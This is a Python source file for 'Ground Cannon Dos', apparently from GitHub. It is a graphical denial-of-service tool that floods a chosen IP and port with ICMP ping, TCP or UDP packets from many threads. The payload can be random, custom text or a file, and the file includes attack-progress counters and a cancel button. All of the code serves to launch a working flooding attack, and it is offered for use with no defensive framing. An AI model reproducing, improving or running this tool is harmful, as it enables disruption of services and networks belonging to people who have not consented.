###################### >>>>>>>>>>> Written by imcyber0wl on github
###################### Ground Cannon Dos
import tkinter as tk
from tkinter import ttk
import tkinter.font as font
from tkinter import filedialog as fd
from tkinter.messagebox import showerror,showinfo
from tkinter import PhotoImage
from icmplib import ping
from random import randbytes 
import time
import threading
import socket
import os

global loadtype
loadtype=0
global filename
filename=0
global global_counter
global_counter=[0,0,0,0,0,0] 

fontset=("Eras Demi ITC", 12)  #
fontset2=("Eras Demi ITC", 10)
fontset3=("Arial",10, "bold")
fontset4=("Arial",11)


#Function to turn off text box in case load type is random. For Random button
def loadrandom():
    global loadtype
    loadtype=1
    textbox2['state']='disabled'
    #lbl3.configure(font = fontset)   
    lbl3['text']="Load is Random."
    lbl3.grid(row=4,column=0,sticky=tk.W)

def loadtbox(): #function to turn textbox on when Custom button is clicked
    global loadtype
    loadtype=0
    textbox2['state']='normal'
    #lbl3.configure(font = fontset)   
    lbl3['text']="Load: "
    lbl3.grid(row=4,column=0,sticky=tk.W)    

def loadisfile(): #update later to make a message box to choose file
    global loadtype
    global filename
    loadtype=2
    textbox2['state']='disabled'
    filetypes_=(('All files', '*.*'),('text files', '*.txt'))    
    filename = fd.askopenfilename(filetypes=filetypes_)
    lbl3['text']="Load: "+str(filename)
    lbl3.grid(row=4,column=0,sticky=tk.W)   
    


######################TCP attack function#####################3  
def tcpatk(port,aload,pktcount,ip_):
    x=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    global global_counter
    
    try:
        x.connect((ip_,port))
    except TimeoutError:
        pktcount=0
        print("TCP failed. TimeoutError")
    except ConnectionRefusedError:
        pktcount=0
        print("TCP failed. ConnectionRefusedError")

    while pktcount>0 and global_counter[4]>0:

        try:
            ss=x.send(aload)
        except ConnectionResetError:
            pktcount=0
            ss=0
        except ConnectionAbortedError:
            pktcount=0
            ss=0

        if  global_counter[5]=="k":
            pktcount=0
            break
        else:
            True

        pktcount-=1
        
        if ss>0 :
            recpkts=1
            lostpkts=0
        else:
            recpkts=0
            lostpkts=1

        global_counter[0]+=1   #sent pkts
        global_counter[1]-=1   #left packets
        global_counter[2]+=recpkts #reached packets
        global_counter[3]+=lostpkts #lost packets

    global_counter[4]-=1
    return 0

            
#########################UDP attack function#####################
def udpatk(port,aload,pktcount,ip_):           
    x=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    global global_counter
   
    while pktcount>0 and global_counter[4]>0:
        x.sendto(aload,(ip_,port))

        if  global_counter[5]=="k":
            pktcount=0
            break
        else:
            True
            
        pktcount-=1            
        global_counter[0]+=1   #sent pkts
        global_counter[1]-=1   #left packets

        global_counter[0]+=1   #sent pkts
        global_counter[1]-=1   #left packets

    global_counter[4]-=1
    return 0

      

###############################PING attack function#############
def pingatk(aload,itrvln,pktcount,ip_):
    lostpkts=0
    senpkts=0
    global global_counter
    while pktcount>0 and global_counter[4]>0:

        if global_counter[5]=="k":
            pktcount=0
            break
        else:
            pass

        try:
            x=ping(ip_,count=1,interval=itrvln, payload=aload,timeout=1)
        except:
            print("couldnt ping. Check internet connection")
        
        pktcount-=1
        recpkts=x.packets_received
        if recpkts>0 :
            recpkts=1
            lostpkts=0
        else:
            recpkts=0
            lostpkts=1            

        global_counter[0]+=1   #sent pkts
        global_counter[1]-=1   #left packets
        global_counter[2]+=recpkts #reached packets
        global_counter[3]+=lostpkts #lost packets        

    global_counter[4]-=1    
    return 0


####################### Main attack function #########################
#################### Set report info, start progress bar, get needed info
#   Prepare load, pick attack type, create threads for attack
### make a thread for attack-thread-creation
### and another one for progress bar

def goatkt2(lblatk5,filepath,prgrsbar,loadtype,loadsize,treadsno,ip_,
    pcount_,textboxload,atktype,intervaln_,portnum):
    #check input
    if type(loadsize)!=int and loadtype==1  :
        lblatk5['text']="-Fix loadsize -"
        lblatk5.grid(row=8,column=0)
        print("Fix loadsize")
        pcount_=0

    elif type(treadsno)!=int or treadsno<=0 :
        lblatk5['text']="-Fix Threads number -"
        lblatk5.grid(row=8,column=0)
        print("Fix threads number")
        pcount_=0

    elif type(pcount_)!=int or pcount_<=0 :
        lblatk5['text']="-Fix Packets number -"
        lblatk5.grid(row=8,column=0)
        print("Fix packet count")
        pcount_=0
 
    elif (atktype=="TCP" or atktype=="UDP") and (type(portnum)!=int or portnum<0 or portnum==0):
        lblatk5['text']="-Fix Port number -"
        lblatk5.grid(row=8,column=0)
        print("Fix port number")
        pcount_=0

    else:
        pass

    if loadtype==1:          #determine type of load
        aload=randbytes(loadsize)
        print("load is random. size: ",loadsize)
    elif loadtype==0 :
        aload=bytes(textboxload,'utf-8')
        print("load is custom.")
    else:
        #loadfile
        file=open(filepath,"r")
        try:
            aload_=file.read()
            aload=bytes(aload_,'utf-8')
            file.close()
            print("load is file")
        except UnicodeDecodeError:
            showerror(title="Error",message="UnicodeDecodeError. Try another file.")
            pcount_=0
            print("Bad file. UnicodeDecodeError")

    recpkts=0
    senpkts=0
    lostpkts=0
    
    if pcount_<0 or pcount_==0:
        treadsno=0
        print("something is wrong. Cant start")
    else:
        #prepare global_counter
        global_counter[5]=0 #not kill!
        global_counter[4]=treadsno #number of threads
        global_counter[3]=0 #packets lost
        global_counter[2]=0 #packets reached
        global_counter[1]=treadsno*pcount_    #total packets
        global_counter[0]=0 #packets sent


    finalthread=threading.Thread(target=create_procs,args=(aload,intervaln_,pcount_,ip_,atktype,treadsno,portnum))
    finalthread.start()
    print("Creating threads...") 

    if pcount_!=0:
        lblatk5['text']="- Attacking -"
        lblatk5.grid(row=8,column=0)        
        prgrsbar.start()      
        prgt=threading.Thread(target=progbar,args=(prgrsbar,))
        prgt.start()
        print("attacking!")
    else:
        False
        
################# Start creating threads
def create_procs(aload,intervaln_,pcount_,ip_,atktype,treadsno,portnum):
    if atktype=="PING" :             #determine atk type
        while(treadsno>0): #ping threads
            tread1=threading.Thread(target=pingatk, args=(aload,
            intervaln_,pcount_,ip_))
            tread1.start()
            lblatk5['text']="Created Process "+str(treadsno)
            lblatk5.grid(row=8,column=0)
          #aload,itrvln,pktcount,q,repdata,ip_
            treadsno-=1

    elif atktype=="TCP" :
         while(treadsno>0): #tcp threads
             tread1=threading.Thread(target=tcpatk, args=(portnum,aload,pcount_,ip_))
             tread1.start()
             lblatk5['text']="Created Process "+str(treadsno)
             lblatk5.grid(row=8,column=0)   
             treadsno-=1
    else:
        lblatkx3['text']="/"
        lblatkx4['text']="/"
        lblatkx3.grid(row=11,column=0)
        lblatkx4.grid(row=12,column=0)  
        while(treadsno>0): #udp threads
            tread1=threading.Thread(target=udpatk, args=(portnum,aload,pcount_,ip_))
            tread1.start()
            lblatk5['text']="Created Process "+str(treadsno)
            lblatk5.grid(row=8,column=0)   
            treadsno-=1
        
    if pcount_!=0:
        lblatk5['text']="- Attacking -"
        lblatk5.grid(row=8,column=0)  
    else:
        True



#########For stopping progress bar when it finishes##############
###########################and for updating report##############
def progbar(prgrsbar):
    global global_counter
    while global_counter[4]>0:
        lblatkx1['text']=global_counter[0]
        lblatkx2['text']=global_counter[1]
        lblatkx3['text']=global_counter[2]
        lblatkx4['text']=global_counter[3]
        lblatkx4.grid(row=12,column=0)
        lblatkx3.grid(row=11,column=0)      
        lblatkx2.grid(row=10,column=0)
        lblatkx1.grid(row=9,column=0)
        time.sleep(1)

    prgrsbar.stop()
    lblatkx4.grid(row=12,column=0)
    lblatkx3.grid(row=11,column=0)      
    lblatkx2.grid(row=10,column=0)
    lblatkx1.grid(row=9,column=0)
              

    if global_counter[1]!=0 and global_counter[5]!="k":
        showinfo(title="Attack stopped",
        message="It didnt finish sending all packets. Target might be down or Connection was closed.\nRun Ground Cannon from cmd and try again if you think there is an error.")
    elif global_counter[1]==0 and global_counter[5]!="k":
        lblatk5['text']="- Attack Stopped -"
        lblatk5.grid(row=8,column=0)
    else:
        lblatk5['text']="- Attack Canceled -"
        lblatk5.grid(row=8,column=0)        

    print("Attack stopped")

###########################Cancel attack
def killatk():
    global global_counter
    global_counter[4]=0
    global_counter[5]="k"

###################second set of attack report labels

if __name__ == "__main__":
    root=tk.Tk()
    root.geometry('603x435+50+50')
    root.resizable(False, False)
    root.grid_columnconfigure(50, weight=1)
    root.grid_rowconfigure(50, weight=1)
    root.title("Ground Cannon")
    try:
        root.iconbitmap(os.getcwd()+'\gсannon.ico')
    except:
        print("couldnt load icon")
    root.attributes('-alpha',0.91) #set transparency
    root.configure(background="black")


    style=ttk.Style(root)
    style.theme_use('xpnative')
    #global loadtype
    style.configure('TLabel',background="black",foreground="white")
    style.configure('TRadiobutton',background="black",foreground="white")    
    loadtype=0 #to decide what kind of load it is. 0=text
#if 1, then random. Other: file

    btnfont = font.Font(family='Eras Demi ITC', size=10)

#piece 1: input target
    lbl1=ttk.Label(root,text="Target:")
    lbl1.configure(font = fontset)
    lbl1.grid(row=0,column=0, sticky=tk.W)
    ip = tk.StringVar()  #where input will be
    textbox = ttk.Entry(root, textvariable=ip, width=34) #box
    textbox.grid(row=1,column=0, sticky=tk.W)


#Checkbox of Target Type
    portlbl=ttk.Label(root,text="Port:")
    portlbl.configure(font = fontset)
    portlbl.grid(row=0,column=0,sticky=tk.E,padx=20)
    portnum=tk.IntVar()
    portbox = ttk.Entry(root, textvariable=portnum,width=10)
    portbox.grid(row=1,column=0, sticky=tk.E)


#############################################################3

##############################################################


#Decide attack type
    atklbl=ttk.Label(root, text="Protocol: ")
    atklbl.configure(font = fontset)
    atklbl.grid(row=2,column=0, sticky=tk.W)

#Radio buttons
#PING button
    checkbox_var2=tk.StringVar()
    checkbox2 = ttk.Radiobutton(root, text='Ping',variable=checkbox_var2,
    value="PING" )
    checkbox2.grid(row=3,column=0, sticky=tk.W)

#TCP button
    checkbox3 = ttk.Radiobutton(root, text='TCP',variable=checkbox_var2,
    value="TCP" )
    checkbox3.grid(row=3,column=0)

#UDP button
    checkbox4 = ttk.Radiobutton(root, text='UDP',variable=checkbox_var2,
    value="UDP" )
    checkbox4.grid(row=3,column=0, sticky=tk.E)

#*****************************Load 

    lbl3=ttk.Label(root, text="Load: ",width=28)
    lbl3.configure(font = fontset)
    lbl3.grid(row=4,column=0,sticky=tk.W)


#Textbox for load             #atkload=tk.StringVar()
    textbox2=tk.Text(root,height=5, width=35)
    textbox2.grid(row=5,column=0)
    scrollbar = ttk.Scrollbar(root, orient='vertical', command=textbox2.yview) 
    textbox2['yscrollcommand'] = scrollbar.set
    scrollbar.grid(row=5,column=1, sticky=tk.N+tk.S+tk.W, padx=0)


#random button
    ranbtn=tk.Button(root, text="Random", command=loadrandom, font=btnfont) 
    ranbtn.grid(row=7, column=0, sticky=tk.W,pady=5,padx=5)

#custom button
    cusbtn=tk.Button(root, text="Custom", command=loadtbox,font=btnfont) 
    cusbtn.grid(row=7, column=0)

#File button
    filebtn=tk.Button(root, text="Use file", command=loadisfile,font=btnfont) 
    filebtn.grid(row=7, column=0, sticky=tk.E)


#Load size
    sizelbl=ttk.Label(root, text="Random load size: ")
    sizelbl.configure(font = fontset2)
    sizelbl.grid(row=1,column=2, sticky=tk.E, padx=5)
    loadsize = tk.IntVar()  #where input will be
    sizentry = ttk.Entry(root, textvariable=loadsize, width=10) #box
    sizentry.grid(row=1,column=3,pady=5,sticky=tk.E,padx=0)

#Number of packets to send
    countlbl=ttk.Label(root, text="Number of Packets: ")
    countlbl.configure(font = fontset2)
    countlbl.grid(row=2,column=2, sticky=tk.E, padx=5)
    pcount = tk.IntVar()  #where input will be
    countentry = ttk.Entry(root, textvariable=pcount, width=10) #box
    countentry.grid(row=2,column=3, pady=5,sticky=tk.E, padx=0)

#Number of threads
    threadslbl=ttk.Label(root, text="Number of Threads: ")
    threadslbl.configure(font = fontset2)
    threadslbl.grid(row=3,column=2, sticky=tk.E, pady=5, padx=5)
    threadsn = tk.IntVar()  #where input will be
    threadsentry = ttk.Entry(root, textvariable=threadsn, width=10) #box
    threadsentry.grid(row=3,column=3,pady=5, padx=0,sticky=tk.E)

#Interval
    intervallbl=ttk.Label(root, text="Ping Interval: ")
    intervallbl.configure(font = fontset2)
    intervallbl.grid(row=4,column=2, sticky=tk.E,padx=5)
    intervaln = tk.IntVar()  #where input will be
    intervalbox=ttk.Spinbox(root, from_=0, to=60, textvariable=intervaln, width=5, wrap=False)
    intervalbox.grid(row=4,column=3,sticky=tk.E, padx=0)


    lblspace=ttk.Label(root,width=10)
    lblspace.grid(row=0,column=1)
#Main one
    prgrsbar=ttk.Progressbar(root,orient="horizontal", length=250, mode='indeterminate')
    prgrsbar.grid(row=13, column=0,sticky=tk.S+tk.W, pady=0, columnspan=3)

    #lblatkx1-4, threads left
    

    #Go! button
    btngo=tk.Button(root,width=7, height=2,font=btnfont, bg="Green", foreground="white", text="Go!",
    command=lambda: goatkt2(lblatk5,filename,prgrsbar,loadtype, loadsize.get(),
    threadsn.get(),ip.get(),pcount.get(),textbox2.get('1.0','end'),
    checkbox_var2.get(),intervaln.get(),portnum.get()))
    #loadtype, ldsize,       treads          ,tstlbl, mxlbl,ip_     pcount_  #textboxload                 #atktype             #intervaln_
    btngo.grid(row=5, column=2, padx=0,pady=3)


    #Kill button
    killbtn=tk.Button(root,font=btnfont, width=8, height=2, text="Kill",bg="red", foreground="white",
    command=killatk)
    killbtn.grid(row=5, column=3, pady=3,sticky=tk.E, padx=0)

    frame1=tk.Canvas(root,width=250,height=200,border=-2,bg="black")
    frame1.grid(row=6,column=2,rowspan=13,columnspan=4,padx=0)
    i_path=os.getcwd()
    try:
        image1=PhotoImage(file=i_path+"\сannon_PNG20-PhotoRoom2.png")
        frame1.create_image(0,-20,image=image1,anchor=tk.N+tk.W)
    except:
        print("couldnt load image")
        
    lblatk5=ttk.Label(root, text=" ")
    lblatk1=ttk.Label(root, text="Packets sent: ")
    lblatk2=ttk.Label(root, text="Packets left: ")
    lblatk3=ttk.Label(root, text="Packets reached: ")
    lblatk4=ttk.Label(root, text="Packets Lost: ")
    lblatk1.configure(font = fontset3)
    lblatk2.configure(font = fontset3)
    lblatk3.configure(font = fontset3)
    lblatk4.configure(font = fontset3)
    lblatk1.grid(row=9,column=0, sticky=tk.W)
    lblatk2.grid(row=10,column=0, sticky=tk.W)
    lblatk3.grid(row=11,column=0, sticky=tk.W)
    lblatk4.grid(row=12,column=0, sticky=tk.W)
    lblatk5.grid(row=8,column=0, pady=0)

    lblatkx1=ttk.Label(root, text="/",width=10)
    lblatkx2=ttk.Label(root, text="/",width=10)
    lblatkx3=ttk.Label(root, text="/", width=10)
    lblatkx4=ttk.Label(root, text="/", width=10)
    lblatkx1.configure(font = fontset4)
    lblatkx2.configure(font = fontset4)
    lblatkx3.configure(font = fontset4)
    lblatkx4.configure(font = fontset4)
    lblatkx1.grid(row=9,column=0,sticky=tk.E, padx=60)
    lblatkx2.grid(row=10,column=0,sticky=tk.E, padx=60)
    lblatkx3.grid(row=11,column=0,sticky=tk.E, padx=60)
    lblatkx4.grid(row=12,column=0, sticky=tk.E, padx=60)

    root.mainloop()
    os._exit(os.X_OK)
